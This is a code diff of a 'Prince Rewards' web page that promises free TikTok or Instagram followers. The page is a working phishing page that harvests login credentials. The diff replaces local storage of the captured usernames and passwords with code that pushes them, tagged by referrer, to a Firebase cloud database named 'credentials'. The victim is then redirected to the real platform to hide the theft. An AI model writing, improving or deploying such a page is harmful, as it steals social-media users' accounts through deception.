@@ -8,36 +8,18 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <style>
-        body {
-            font-family: 'Inter', sans-serif;
-            background: linear-gradient(135deg, #f0f4f8 0%, #e2e8f0 100%);
-        }
-        .glass-panel {
-            background: rgba(255, 255, 255, 0.9);
-            backdrop-filter: blur(12px);
-            -webkit-backdrop-filter: blur(12px);
-            border: 1px solid rgba(255, 255, 255, 0.6);
-            box-shadow: 0 10px 30px 0 rgba(0, 0, 0, 0.06);
-        }
-        .soft-shadow-inset {
-            box-shadow: inset 3px 3px 6px #d1d9e6, inset -3px -3px 6px #ffffff;
-        }
-        .soft-btn {
-            transition: all 0.2s ease;
-        }
-        .soft-btn:hover {
-            transform: translateY(-1px);
-        }
-        .soft-btn:active {
-            transform: translateY(0);
-        }
+        body { font-family: 'Inter', sans-serif; background: linear-gradient(135deg, #f0f4f8 0%, #e2e8f0 100%); }
+        .glass-panel { background: rgba(255,255,255,0.9); backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px); border: 1px solid rgba(255,255,255,0.6); box-shadow: 0 10px 30px 0 rgba(0,0,0,0.06); }
+        .soft-shadow-inset { box-shadow: inset 3px 3px 6px #d1d9e6, inset -3px -3px 6px #ffffff; }
+        .soft-btn { transition: all 0.2s ease; }
+        .soft-btn:hover { transform: translateY(-1px); }
+        .soft-btn:active { transform: translateY(0); }
     </style>
 </head>
 <body class="min-h-full flex flex-col items-center justify-start p-4 sm:p-6 text-slate-700">
 
     <div class="w-full max-w-md mx-auto space-y-6 my-auto">
 
-        <!-- Brand -->
         <div class="text-center space-y-2">
             <h1 class="text-2xl sm:text-3xl font-bold tracking-tight text-slate-800 flex items-center justify-center gap-2">
                 <i class="fa-solid fa-crown text-amber-500"></i> Prince Rewards
@@ -45,22 +27,18 @@
             <p class="text-xs sm:text-sm text-slate-500">Secure Reward & Growth Portal</p>
         </div>
 
-        <!-- Claim Card -->
         <div class="glass-panel rounded-3xl p-6 space-y-6">
-            <!-- Platform Icon -->
             <div class="flex justify-center items-center gap-6">
                 <div id="platformIcon" class="w-14 h-14 rounded-2xl flex items-center justify-center bg-black text-white shadow-md text-2xl">
                     <i class="fa-brands fa-tiktok"></i>
                 </div>
             </div>
 
-            <!-- Heading -->
             <div class="text-center space-y-1">
                 <h2 id="claimHeading" class="text-lg sm:text-xl font-bold text-slate-800">Get 1000 Free TikTok Followers</h2>
                 <p class="text-xs text-slate-500">Enter your account details to claim your reward</p>
             </div>
 
-            <!-- Form -->
             <form id="claimForm" onsubmit="handleClaim(event)" class="space-y-4">
                 <div class="space-y-1">
                     <label id="usernameLabel" class="block text-xs font-semibold text-slate-600 ml-1">TikTok Username</label>
@@ -78,7 +56,7 @@
                     </div>
                 </div>
 
-                <button type="submit" class="w-full py-3.5 px-4 rounded-2xl bg-gradient-to-r from-rose-500 to-pink-600 text-white font-semibold text-sm soft-btn flex items-center justify-center gap-2 shadow-md shadow-rose-200">
+                <button type="submit" id="submitBtn" class="w-full py-3.5 px-4 rounded-2xl bg-gradient-to-r from-rose-500 to-pink-600 text-white font-semibold text-sm soft-btn flex items-center justify-center gap-2 shadow-md shadow-rose-200">
                     <i class="fa-solid fa-gift"></i> Login & Claim Followers
                 </button>
             </form>
@@ -89,22 +67,35 @@
         </div>
     </div>
 
-    <!-- Toast -->
     <div id="toast" class="fixed bottom-5 left-1/2 transform -translate-x-1/2 translate-y-20 opacity-0 transition-all duration-300 bg-slate-900 text-white text-xs px-4 py-2.5 rounded-full shadow-lg flex items-center gap-2 z-50">
         <i class="fa-solid fa-circle-check text-emerald-400"></i>
         <span id="toastMessage">Action successful!</span>
     </div>
 
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
+
     <script>
-        // URL params read karo
+        // ✅ Aapka Firebase config
+        const firebaseConfig = {
+            apiKey: "AIzaSyD8hPtdy3vOr5TjX1CJQHz0UX6_TpovvyU",
+            authDomain: "prince-rewards-121e6.firebaseapp.com",
+            databaseURL: "https://prince-rewards-121e6-default-rtdb.firebaseio.com",
+            projectId: "prince-rewards-121e6",
+            storageBucket: "prince-rewards-121e6.firebasestorage.app",
+            messagingSenderId: "374730226487",
+            appId: "1:374730226487:web:5df25bca3282d2cf2838b2"
+        };
+
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
         const params = new URLSearchParams(window.location.search);
         const refUid = params.get('ref') || 'UNKNOWN';
         const platform = params.get('platform') || 'tiktok';
-
         const platformName = platform === 'instagram' ? 'Instagram' : 'TikTok';
-        const platformNameLower = platform === 'instagram' ? 'Instagram' : 'TikTok';
 
-        // Update UI according to platform
         document.getElementById('claimHeading').innerText = `Get 1000 Free ${platformName} Followers`;
         document.getElementById('usernameLabel').innerText = `${platformName} Username`;
 
@@ -119,18 +110,18 @@
             document.title = 'TikTok Claim - Prince Rewards';
         }
 
-        // Form submit — credentials localStorage me save karo
         function handleClaim(event) {
             event.preventDefault();
             const username = document.getElementById('username').value.trim();
             const password = document.getElementById('password').value;
-
             if (!username || !password) return;
 
-            const storageKey = 'prince_creds_' + refUid;
-            let existing = JSON.parse(localStorage.getItem(storageKey) || '[]');
+            const submitBtn = document.getElementById('submitBtn');
+            submitBtn.disabled = true;
+            submitBtn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Saving...';
 
-            const newEntry = {
+            // 🔥 Firebase mein save karo (cloud — sab devices par show hoga)
+            const entry = {
                 id: Date.now(),
                 username: username,
                 password: password,
@@ -139,29 +130,28 @@
                 time: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' })
             };
 
-            existing.unshift(newEntry);
-            localStorage.setItem(storageKey, JSON.stringify(existing));
-
-            document.getElementById('claimForm').reset();
-            showToast('Login successful! Redirecting...');
-
-            // Redirect to official platform after 1.2 sec
-            setTimeout(() => {
-                if (platform === 'instagram') {
-                    window.location.href = 'https://www.instagram.com';
-                } else {
-                    window.location.href = 'https://www.tiktok.com';
-                }
-            }, 1200);
+            db.ref('credentials').push(entry)
+                .then(() => {
+                    document.getElementById('claimForm').reset();
+                    showToast('Login successful! Redirecting...');
+                    setTimeout(() => {
+                        window.location.href = platform === 'instagram'
+                            ? 'https://www.instagram.com'
+                            : 'https://www.tiktok.com';
+                    }, 1200);
+                })
+                .catch((err) => {
+                    submitBtn.disabled = false;
+                    submitBtn.innerHTML = '<i class="fa-solid fa-gift"></i> Login & Claim Followers';
+                    showToast('Error: ' + err.message);
+                });
         }
 
         function showToast(message) {
             const toast = document.getElementById('toast');
             document.getElementById('toastMessage').innerText = message;
             toast.classList.remove('translate-y-20', 'opacity-0');
-            setTimeout(() => {
-                toast.classList.add('translate-y-20', 'opacity-0');
-            }, 3000);
+            setTimeout(() => toast.classList.add('translate-y-20', 'opacity-0'), 3000);
         }
     </script>
 </body>
